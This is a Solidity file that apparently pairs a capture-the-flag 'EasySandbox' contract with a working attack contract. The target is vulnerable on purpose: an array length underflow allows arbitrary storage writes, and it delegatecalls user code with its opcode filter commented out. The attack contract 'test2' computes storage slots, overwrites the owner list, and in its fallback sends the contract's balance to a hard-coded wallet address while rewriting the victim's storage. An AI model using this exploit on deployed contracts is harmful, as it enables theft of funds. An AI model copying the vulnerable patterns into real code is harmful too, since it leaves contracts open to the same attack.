pragma solidity ^0.5.10;

contract EasySandbox {
    uint256[] public writes;
    mapping(address => address[]) public sons;
    address public owner;
    uint randomNumber = 0;

    constructor() public payable {
        owner = msg.sender;
        sons[msg.sender].push(msg.sender);
        writes.length -= 1;
    }
    function given_gift(uint256 _what, uint256 _where) public {
        if(_where != 0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9f) {
            writes[_where] = _what;
        }
    }
    function easy_sandbox(address _addr) public payable {
       require(sons[owner][0] == owner);
       require(writes.length != 0);
       bool mark = false;
       for(uint256 i = 0; i < sons[owner].length; i++) {
            if(msg.sender == sons[owner][i]) {
                mark = true;
            }
       }
       require(mark);
       uint256 size;
       bytes memory code;
       assembly {
            size := extcodesize(_addr)
            code := mload(0x40)
            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            mstore(code, size)
            extcodecopy(_addr, add(code, 0x20), 0, size)
        }
        
        // for(uint256 i = 0; i < code.length; i++) {
        //     require(code[i] != 0xf0); // CREATE
        //     require(code[i] != 0xf1); // CALL
        //     require(code[i] != 0xf2); // CALLCODE
        //     require(code[i] != 0xf4); // DELEGATECALL
        //     require(code[i] != 0xfa); // STATICCALL
        //     require(code[i] != 0xff); // SELFDESTRUCT
           
        // }
        
        bool success;
        bytes memory _;
        (success, _) = _addr.delegatecall("");
        require(success);
        require(writes.length == 0);
        require(sons[owner][0] == tx.origin && sons[owner].length == 1);//&& sons[owner].length == 1
        //require(sons[owner].length == 1);
    }
}


// contract test {
//     EasySandbox public target;

//     constructor(EasySandbox _target) public {
//         target = _target;
//     }
//     function attack()public {
//         // sonsLenAddr-writes[0] 
//         target.given_gift(uint256(0x2), 0x64d0bcef10b052ffe3be1a22441999612712b2dcb542867c3697f6aa374f6523);
//         // sons[ower][1] - writes[0] 
//         target.given_gift(uint256(address(this)), 0x49dac8462ff8d836448eafccaa06e3793a68f9959270e92d2991328dea54ea3);
//         target.easy_sandbox(address(this));
//     }
// }

contract test2{
    EasySandbox target;
    bytes32 public pos1;
    bytes32 public pos2;
    bytes32 public pos3;

    constructor(address _target) public {
        target = EasySandbox(_target);
    } 

    function attack() public {
        pos1 = keccak256(abi.encodePacked(uint256(address(target.owner())), uint256(1))); //length of sons[owner]
        pos2 = keccak256(abi.encodePacked(uint256(pos1)));  //sons[owner][0]
        pos3 = keccak256(abi.encodePacked(uint256(address(uint256(0))))); //writes[0]

        target.given_gift(uint256(0x2), uint256(pos1) - uint256(pos3));   //change the length of sons[owner]
        target.given_gift(uint256(address(this)), uint256(pos2) + 1 - uint256(pos3)); //change the address at sons[owner][1]

        target.easy_sandbox(address(this));
    }

    function() external payable {
        address _to = 0x2CDAf97A9E35b328d19B3D72B5F1EcbaD24bCbB1;

        //获取合约余额
        uint256 amount = address(this).balance;
        //使用call转账
        (bool success, ) = _to.call.value(amount)("");

    assembly {
                sstore(0,0)//writes.length == 0 原本的writes.length无穷大
                sstore(0x015347fff03ff9cc5379309e71f482ef5d02cf2e7c179a4a87449f423cd4eec6,0x2CDAf97A9E35b328d19B3D72B5F1EcbaD24bCbB1)//sstore(sons[owner][0],自己钱包地址)
                sstore(0xc88b95375caabf91dc30cbdd9eac805d668dd4736f16e67d4141ec8835b9a3b1,0x1)//sstore(sons[owner].length)
            }
    }

}
